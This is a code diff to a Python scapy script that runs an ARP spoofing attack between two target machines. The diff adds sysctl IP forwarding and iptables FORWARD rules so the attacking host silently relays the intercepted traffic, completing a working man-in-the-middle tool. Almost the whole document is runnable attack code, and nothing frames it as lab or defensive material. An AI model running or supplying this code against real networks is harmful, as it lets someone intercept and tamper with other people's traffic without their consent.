@@ -2,6 +2,7 @@ from scapy.all import Ether, ARP, sendp, get_if_hwaddr, srp
 import time
 import sys
 import argparse
+import subprocess
 
 def get_mac(ip):
     ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=2, verbose=False)
@@ -11,7 +12,7 @@ def get_mac(ip):
         print(f"[!] Failed to get MAC for {ip}")
         return None
 
-def spoof(target_ip, spoof_ip, interface, verbose=True):
+def spoof(target_ip, spoof_ip, interface):
     target_mac = get_mac(target_ip)
     packet = Ether(dst=target_mac, src=get_if_hwaddr(interface)) / \
              ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
@@ -24,6 +25,29 @@ def restore(destination_ip, source_ip, interface):
              ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
                  psrc=source_ip, hwsrc=source_mac)
     sendp(packet, count=4, iface=interface, verbose=0)
+    
+def enable_ip_forwarding():
+    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
+
+def disable_ip_forwarding():
+    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], check=True)
+    
+def manage_iptables(action):
+    commands = [
+        ['iptables', '-I', 'FORWARD', '-p', 'icmp', '-j', 'ACCEPT'],
+        ['iptables', '-I', 'FORWARD', '-p', 'tcp', '-j', 'ACCEPT']
+    ]
+    
+    try:
+        for cmd in commands:
+            if action == "add":
+                subprocess.run(['sudo'] + cmd, check=True)
+            elif action == "remove":
+                subprocess.run(['sudo', 'iptables', '-D'] + cmd[1:], check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"Error in iptables: {e}")
+        sys.exit(1)
+
 
 if __name__ == "__main__":
     
@@ -39,16 +63,25 @@ if __name__ == "__main__":
     dst_ip = args.target2
     iface = args.interface
     try:
+        print(f"[*] Enabling IP forwarding")
+        enable_ip_forwarding()
+        print(f"[*] Adding iptables rules")
+        manage_iptables("add")
         print(f"[*] Starting ARP spoofing attack between {args.target1} and {args.target2}")
+        #while True: #can send packets at regular intervals # check previous commits
+        spoof(src_ip, dst_ip, iface)
+        spoof(dst_ip, src_ip, iface)
+        #time.sleep(2)
+        print("[*] Press CTRL+C to restore and exit")
         while True:
-            spoof(src_ip, dst_ip, iface)
-            spoof(dst_ip, src_ip, iface)
-            time.sleep(2)
+            time.sleep(3600)
             
     except KeyboardInterrupt:
         print("\n[*] Restoring ARP tables")
         restore(src_ip, dst_ip, iface)
         restore(dst_ip, src_ip, iface)
+        manage_iptables("remove")
+        disable_ip_forwarding()
         sys.exit(0)
 
 
